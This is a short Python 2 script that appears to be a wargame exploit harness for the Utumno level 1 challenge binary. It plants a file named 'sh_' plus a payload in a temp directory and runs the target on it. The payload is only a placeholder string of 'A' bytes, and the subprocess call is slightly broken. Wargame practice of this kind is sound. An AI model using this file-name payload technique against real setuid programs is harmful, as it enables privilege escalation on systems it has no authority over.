#!/usr/bin/python2

import tempfile
import shutil
import subprocess

bts = [chr(i) for i in range(256)]

def execute_payload(payload):
    temp_dir = tempfile.mkdtemp()
    print("Dirctory: " + temp_dir)
    open(temp_dir + "/sh_" + payload, 'w').close()
    subprocess.check_output("/utumno/utumno1", temp_dir, stderr=subprocess.STDOUT)

    shutil.rmtree(temp_dir)


def main():
    execute_payload("\x41\x41\x41\x41")

if __name__ == "__main__":
    main()
